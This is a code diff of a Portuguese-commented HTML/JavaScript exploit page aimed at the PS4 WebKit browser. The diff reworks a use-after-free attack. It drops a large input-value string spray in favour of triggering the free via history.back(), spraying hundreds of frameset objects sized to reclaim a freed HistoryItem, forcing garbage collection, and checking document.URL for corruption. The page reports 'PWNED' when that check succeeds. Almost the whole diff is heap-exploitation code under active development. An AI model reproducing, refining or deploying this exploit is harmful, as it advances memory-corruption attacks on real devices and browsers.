@@ -2,24 +2,24 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - DOM Input Spray</title>
+<title>PS4 WebKit - Small Object Attack</title>
 <style>
-    body { background-color: #200; color: #ff5555; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #aaaaff; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #f55; background: #500; color: #fff;
+        border: 2px solid #55f; background: #002; color: #fff;
         text-transform: uppercase;
     }
-    #log { border: 1px solid #700; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
-    .success { color: #fff; background-color: #f00; padding: 5px; font-weight: bold;}
+    #log { border: 1px solid #335; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
+    .success { color: #fff; background-color: #00f; padding: 5px; font-weight: bold;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - DOM Input Reclaim</h2>
-<div id="status">Estratégia: input.value Spray (340KB)</div>
+<h2>PS4 WebKit - Small Object Reclaim (Container Attack)</h2>
+<div id="status">Alvo: HistoryItem / SSV (~80-160 bytes)</div>
 
-<button onclick="runDOMExploit()">INICIAR ATAQUE DOM</button>
+<button onclick="runSmallAttack()">INICIAR ATAQUE AO CONTAINER</button>
 
 <div id="log"></div>
 
@@ -35,49 +35,40 @@ function log(m, type="") {
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-var inputs = [];
-var sprayData = [];
+var keepAlive = [];
 
-// Gera a string de ataque "AAAA..." uma única vez
-function preparePayload(len) {
-    let arr = new Array(len);
-    for(let i=0; i<len; i++) arr[i] = "A";
-    return arr.join("");
+// TÉCNICA PSFREE: GC para garantir limpeza do Small Heap
+function forceGC() {
+    for (let i = 0; i < 2; i++) {
+        new Uint8Array(4 * 1024 * 1024);
+    }
 }
 
-async function runDOMExploit() {
+async function runSmallAttack() {
     logEl.innerHTML = "";
-    inputs = [];
-    statusEl.innerText = "Carregando armas...";
+    keepAlive = [];
+    statusEl.innerText = "Preparando...";
 
-    // ALVO: 340.356 bytes
-    // Variação de tamanho para garantir encaixe
-    const TARGET = 340356;
-    
-    log(`1. Gerando Payloads DOM (${TARGET} bytes)...`);
-    
+    // === ESTRATÉGIA ===
+    // Ignoramos o buraco de 340KB da string.
+    // Vamos tentar pegar a vaga do objeto HistoryItem que segurava essa string.
+    // Tamanho estimado: 80 a 160 bytes.
+    // Frameset: Cada vírgula = 8 bytes.
+    // Range: 10 a 30 vírgulas.
+
+    log("1. Pré-calculando Small Sprays...");
     let payloads = [];
-    for(let delta = -64; delta <= 64; delta += 4) {
-        payloads.push(preparePayload(TARGET + delta));
-    }
-
-    // === FASE 1: GROOMING (DOM) ===
-    log("2. Criando campo minado de Inputs...");
     
-    // Cria 500 inputs invisíveis
-    const container = document.createElement("div");
-    container.style.display = "none";
-    document.body.appendChild(container);
-
-    for(let i=0; i<500; i++) {
-        let inp = document.createElement("input");
-        inp.type = "text";
-        container.appendChild(inp);
-        inputs.push(inp);
+    // Varredura fina (passo de 1 vírgula = 8 bytes de precisão)
+    for(let i = 8; i < 40; i++) {
+        try {
+            payloads.push(",".repeat(i));
+        } catch(e) {}
     }
-    
-    // === FASE 2: TRIGGER UAF ===
-    log("3. Disparando UAF...");
+    log(`Gerados ${payloads.length} payloads (64 bytes a 320 bytes).`);
+
+    // === TRIGGER UAF (INTACTO) ===
+    log("2. Disparando UAF Gigante (para liberar o Container)...");
     
     let size = 977;
     const STEP = 14461;
@@ -91,57 +82,71 @@ async function runDOMExploit() {
         
         // MOMENTO CRÍTICO
         if (i === 47) {
-            log(">>> ATAQUE DOM IMEDIATO <<<");
+            log(">>> SPRAY DE OBJETOS PEQUENOS <<<");
             
             // 1. Libera memória
             setTimeout(() => history.back(), 0);
             
-            // 2. Preenche os Inputs com as strings gigantes
-            // Isso força alocações massivas no Heap da DOM
-            for(let k=0; k < inputs.length; k++) {
-                // Usa payloads variados para "varrer" os tamanhos
-                let p = payloads[k % payloads.length];
-                inputs[k].value = p;
-            }
+            // 2. Inunda o Small Heap com Framesets
+            // Isso deve atropelar o HistoryItem recém-liberado
+            doSmallSpray(payloads);
             
-            // 3. Force Layout (Tenta forçar o navegador a renderizar e limpar caches)
-            let dummy = document.body.offsetHeight;
+            // 3. Força GC para consolidar
+            setTimeout(() => forceGC(), 10);
         } else {
             size += STEP;
             await sleep(5);
         }
     }
     
-    await sleep(200);
+    await sleep(300);
 
-    // === FASE 3: VERIFICAÇÃO ===
+    // === VERIFICAÇÃO ===
     checkResult();
 }
 
+function doSmallSpray(payloads) {
+    // Cria milhares de objetos pequenos rapidamente
+    // Para cada tamanho de payload, criamos 100 instâncias
+    for(let p of payloads) {
+        for(let k=0; k<20; k++) {
+            let f = document.createElement("frameset");
+            f.rows = p;
+            keepAlive.push(f);
+        }
+    }
+}
+
 function checkResult() {
-    statusEl.innerText = "Verificando danos...";
+    statusEl.innerText = "Verificando...";
     let url = document.URL;
-    let changed = false;
-    let sample = "";
     
-    // Procura por 'A'
-    for(let i=1000; i<5000; i++) {
-        if(url.charCodeAt(i) === 0x41) { 
-            changed = true;
-            sample = "Encontrado 'A' no offset " + i;
+    // Se sobrescrevermos o HistoryItem, o ponteiro da string será corrompido.
+    // Isso deve causar uma de duas coisas:
+    // 1. Crash do navegador (Tela de Erro CE-...). ISSO É SUCESSO.
+    // 2. URL mudando para caracteres aleatórios/inválidos.
+    
+    log("URL Length: " + url.length);
+    
+    // Checagem de integridade
+    let isV = true;
+    for(let i=1000; i<1100; i++) {
+        if(url.charCodeAt(i) !== 0x56) {
+            isV = false;
             break;
         }
     }
 
-    if(changed) {
-        log("!!! SUCESSO !!!", "success");
-        log("DOM Input Spray funcionou!");
-        log(sample);
-        statusEl.innerText = "PWNED: DOM";
+    if(!isV) {
+        log("!!! MUDANÇA DETECTADA !!!", "success");
+        log("O Container foi corrompido!");
+        let sample = "";
+        for(let k=1000; k<1020; k++) sample += url.charCodeAt(k).toString(16) + " ";
+        log("Dump: " + sample);
+        statusEl.innerText = "PWNED: CONTAINER";
     } else {
-        log("Falha: Ainda vendo 'V'.");
-        log("Diagnóstico: O cache está segurando o objeto com força total.");
-        log("Próximo passo sugerido: Tentar corromper o Length (Write Primitive às cegas).");
+        log("Ainda estável ('V').");
+        log("Se o navegador CRASHAR agora ou em breve, comemore.");
     }
 }
 </script>
